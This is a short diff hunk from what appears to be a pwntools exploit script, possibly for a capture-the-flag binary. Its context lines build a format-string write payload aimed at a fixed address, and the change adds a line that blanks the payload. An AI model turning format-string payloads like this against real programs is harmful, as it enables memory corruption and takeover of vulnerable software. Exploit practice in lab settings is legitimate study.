@@ -62,6 +62,7 @@ a = 0x601020-8+2
 
 writes = {a: 0x4540000000000000}
 pl = fmtstr_payload(6, writes, write_size='byte')
+pl = b''
 
 print(len(pl))
 
